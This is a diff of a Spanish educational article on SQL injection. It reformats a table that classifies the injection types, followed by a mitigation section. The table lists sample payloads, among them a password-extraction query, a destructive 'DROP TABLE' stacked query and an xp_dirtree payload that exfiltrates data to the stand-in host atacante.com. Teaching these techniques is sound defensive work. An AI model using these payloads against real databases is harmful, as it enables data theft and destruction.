@@ -59,36 +59,16 @@ Para que este engaño funcione en motores relacionales, los atacantes inyectan c
 
 Una vez que se rompe la barrera entre "datos" e "instrucciones", el ataque evoluciona en diferentes variantes dependiendo de cómo el sistema devuelva la información. A continuación, se clasifican las formas más comunes:
 
-| Categoría Principal | Técnica Específica | Descripción del Mecanismo | Ejemplo de Payload | Escenario de Explotación en el Backend |
-| --- | --- | --- | --- | --- |
-| **In-Band (Misma Banda)** | **Basada en Errores (Error-Based)** | El atacante inyecta sintaxis malformada intencionalmente para forzar al motor de la base de datos a devolver un mensaje de error detallado. Estos errores revelan información sobre la estructura de las tablas, columnas o la versión del motor. | `' OR 1=CONVERT(int, (SELECT @@version)) --` | Al fallar la búsqueda en un CRUD de productos, el servidor devuelve un código HTTP 500 exponiendo el *stack trace* completo con el nombre de la base de datos de producción. |
-| **In-Band (Misma Banda)** | **Basada en UNION (UNION-Based)** | Utiliza el operador `UNION SELECT` para anexar los resultados de una consulta maliciosa a los de una consulta legítima. Requiere que ambas consultas tengan el mismo número de columnas y tipos de datos compatibles.
+| **Categoría Principal** | **Técnica Específica** | **Descripción del Mecanismo** | **Ejemplo de Payload** | **Escenario de Explotación en el Backend** |
+|---|---|---|---|---|
+| **In-Band (Misma Banda)** | **Basada en Errores (Error-Based)** | El atacante introduce instrucciones SQL malformadas con el propósito de provocar errores controlados en el motor de base de datos. Los mensajes de error generados pueden revelar información sensible, como nombres de tablas, columnas, rutas del sistema, versiones del SGBD o detalles de la configuración interna. | `' OR 1=CONVERT(int,(SELECT @@version)) --` | Durante la ejecución de un CRUD de productos, una excepción no controlada genera un código HTTP 500 y expone el *stack trace* completo, revelando el nombre de la base de datos, el tipo de gestor utilizado y parte de la consulta ejecutada. |
+| **In-Band (Misma Banda)** | **Basada en UNION (UNION-Based)** | Aprovecha el operador `UNION SELECT` para combinar el resultado de una consulta maliciosa con el de una consulta legítima. Para que el ataque sea exitoso, ambas consultas deben poseer el mismo número de columnas y tipos de datos compatibles. | `' UNION SELECT 1, version(), current_database() --` | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios limitados intercepta la petición `GET /api/categorias?id=1` e inyecta una consulta `UNION` para obtener identificadores de inquilinos (`tenant_id`) y credenciales de otros administradores almacenadas en la base de datos. |
+| **Inferencial (Ciega)** | **Basada en Booleanos (Boolean-Based)** | Se presenta cuando la aplicación no muestra directamente los datos ni devuelve errores explícitos. El atacante inyecta expresiones lógicas que producen resultados verdaderos o falsos y analiza cambios sutiles en la respuesta HTTP, el contenido renderizado o el comportamiento de la aplicación para inferir información de la base de datos. | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al manipular un endpoint de autenticación, la aplicación responde de manera distinta según la condición evaluada. Las variaciones en los mensajes o en el contenido de la respuesta permiten reconstruir datos sensibles carácter por carácter. |
+| **Inferencial (Ciega)** | **Basada en Tiempo (Time-Based)** | Similar a la técnica basada en booleanos, pero utilizada cuando la aplicación no presenta cambios visibles en sus respuestas. El atacante introduce funciones de retardo deliberado y mide el tiempo de respuesta del servidor para determinar si la condición inyectada fue evaluada como verdadera. | **MySQL:** `' OR IF(1=1, SLEEP(5), 0) --`<br><br>**PostgreSQL:** `' OR (SELECT pg_sleep(5)) IS NOT NULL --` | El payload se inserta en un proceso de normalización de datos. Si la respuesta del servidor presenta un retraso constante de cinco segundos, el atacante confirma la vulnerabilidad y procede a extraer información mediante consultas secuenciales basadas en tiempos de respuesta. |
+| **Consultas Apiladas (Stacked Queries)** | **Ataques Destructivos / DDL-DML** | Consiste en finalizar la consulta original mediante un punto y coma (`;`) y concatenar instrucciones adicionales, como `DROP`, `UPDATE`, `INSERT` o `DELETE`. Su viabilidad depende de las restricciones impuestas por el controlador de conexión y la configuración del motor de base de datos. | `1'); DROP TABLE categorias_crud; --` | En determinadas configuraciones de PostgreSQL, un uso incorrecto del controlador de acceso puede permitir la ejecución de múltiples sentencias en una sola petición. En consecuencia, un atacante podría modificar o eliminar datos críticos mediante instrucciones concatenadas. |
+| **Out-of-Band (OOB)** | **Exfiltración Externa** | Se emplea cuando no es posible obtener información mediante respuestas directas o técnicas inferenciales. El atacante induce al motor de base de datos a realizar comunicaciones externas, como consultas DNS o solicitudes HTTP, enviando los datos extraídos hacia un servidor bajo su control. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(SQL Server)* | Tras ejecutar el payload, el servidor de base de datos realiza una resolución DNS hacia un dominio controlado por el atacante, por ejemplo `password_robada.atacante.com`. El atacante posteriormente analiza los registros de su servidor para recuperar la información exfiltrada. |
 
- | <br>`' UNION SELECT 1, version(), current_database() --` 
-
- | En un ERP con arquitectura *multi-tenant*, un usuario con privilegios bajos intercepta la petición `GET /api/categorias?id=1` e inyecta un `UNION` para extraer los `tenant_id` y contraseñas de otros administradores. |
-| **Inferencial (Ciega)** | **Basada en Booleanos (Boolean-Based)** | Ocurre cuando el backend no devuelve datos ni errores en la pantalla. El atacante inyecta condiciones lógicas (Verdadero/Falso) y observa si la respuesta HTTP o el comportamiento de la página cambian para inferir si la inyección fue exitosa.
-
- | `1' AND (SELECT SUBSTRING(password,1,1) FROM usuarios WHERE id=1)='a' --` | Al inyectar la condición en un endpoint de inicio de sesión, si la respuesta es "Usuario no encontrado", la letra adivinada es incorrecta; si la respuesta cambia, la letra es correcta. |
-| **Inferencial (Ciega)** | **Basada en Tiempo (Time-Based)** | Similar a la anterior, pero cuando el sistema ni siquiera cambia su respuesta ante condiciones verdaderas o falsas. El atacante fuerza a la base de datos a pausar su ejecución y mide el tiempo de respuesta del servidor.
-
- | MySQL: `' OR IF(1=1, SLEEP(5), 0) --` 
-
-<br>
-
-<br>
-
-<br>PostgreSQL: `' OR (SELECT pg_sleep(5)) IS NOT NULL --` 
-
- | Se inyecta el payload en un script de normalización de datos. Si el servidor tarda exactamente 5 segundos adicionales en responder, el atacante confirma que el sistema es vulnerable y comienza a extraer datos letra por letra. |
-| **Consultas Apiladas (Stacked Queries)** | **Ataques Destructivos / DDL** | Consiste en finalizar la consulta original con un punto y coma (`;`) y concatenar comandos DDL o DML (como `DROP`, `UPDATE` o `INSERT`). Su éxito depende netamente del *driver* de conexión del backend.
-
- | `1'); DROP TABLE categorias_crud; --` | Altamente crítico en PostgreSQL, donde muchos *drivers* (como `psycopg2` si se usan mal) permiten enviar múltiples instrucciones separadas por `;` en una sola llamada. En MySQL, librerías modernas como PDO o conectores en Python bloquean esto por defecto arrojando errores de sintaxis.
-
- |
-| **Out-of-Band (OOB)** | **Exfiltración Externa** | Se utiliza cuando el atacante no puede extraer los datos mediante la misma conexión web ni inferirlos por tiempo. Fuerza al motor de base de datos a realizar una petición externa (como una consulta DNS o HTTP) hacia un servidor controlado por el atacante, enviando los datos robados en la petición. | `'; EXEC master..xp_dirtree '//atacante.com/datos' --` *(Específico de SQL Server)* | Un atacante inyecta el payload; el servidor de base de datos realiza una resolución DNS hacia `password_robada.atacante.com`. El atacante revisa los *logs* de su servidor DNS para capturar la información extraída. |
-
----
+> **Nota:** Las técnicas **In-Band** utilizan el mismo canal de comunicación de la aplicación para inyectar y recuperar información, las técnicas **Inferenciales (Blind)** deducen los datos a partir del comportamiento del sistema y las técnicas **Out-of-Band (OOB)** emplean canales externos de comunicación para la extracción de información.
 
 ## Mejores Prácticas de Mitigación
 
